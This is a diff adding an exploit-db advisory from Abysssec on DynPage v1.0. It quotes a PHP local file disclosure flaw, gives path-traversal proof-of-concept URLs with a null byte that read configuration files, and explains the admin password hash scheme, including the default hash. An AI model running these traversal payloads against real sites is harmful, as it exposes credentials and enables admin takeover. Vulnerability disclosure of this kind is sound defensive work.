@@ -1,0 +1,70 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+ http://www.exploit-db.com/moaub-7-dynpage-multiple-remote-vulnerabilities/
+'''
+
+- Title  : DynPage Multiple Remote Vulnerabilities.
+- Affected Version : <= v1.0
+- Vendor  Site   : http://www.dynpage.net
+ 
+- Discovery : Abysssec.com
+ 
+ 
+- Description :
+===============
+DynPage allows you to edit Websites online and make pieces of contents editable with a comfortable editor.
+DynPage implements the CKeditor - one of the best Internet editors. 
+The integration of content into the HTML pages can be done with Ajax/Javascript or PHP - so you can also handle cross domain sites. 
+DynPage is written in PHP and does not require MySQL database. It's easy to install and to configurate.
+
+- Vulnerabilities:
+==================
+1)Local File Disclosure:
+---------------------
+	+Code:
+	/content/dynpage_load.php #[line(20-28)]:
+
+	$filename = $_GET["file"];
+	if (!is_dir ($filename) && file_exists ($filename)) {
+	
+		$bytes = filesize ($filename);
+		$fh = fopen($filename, 'r');
+		print (fread ($fh, $bytes));
+		fclose ($fh);
+
+	}
+
+
+	+POC: 
+	     http://www.Site.com/dynpage/content/dynpage_load.php?file=../.htaccess%00
+
+
+2)Admin hash Disclosure:
+---------------------------------
+	The Admin password hash format:	MD5('admin:'+$password)
+	then password's salt is "admin:".
+
+	2-a)Default password is admin,that stored in config_global.inc.php(line 41-42 )
+			// Default login admin
+			"default_login_hash" => "d2abaa37a7c3db1137d385e1d8c15fd2",
+	+POC:for see this hash:
+	  http://www.Site.com/dynpage/content/dynpage_load.php?file=../config_global.inc.php%00
+
+	2-b)the hash  password  stored as SESSION in /conf/init.inc.php.
+		<?php
+			// This file is generated automatically!
+			// No not modify manually!
+			$_SESSION['DYNPAGE_CONF_VAR_ALL']['login_hash']="2d08086927f4d87a31154aaf0ba2e067";
+			$_SESSION['DYNPAGE_CONF_VAR_ALL']['admin_email']="a@a.com";
+		?>
+	+POC:for see this hash:
+	  http://www.Site.com/dynpage/content/dynpage_load.php?file=../conf/init.inc.php%00
+
+
+ 			
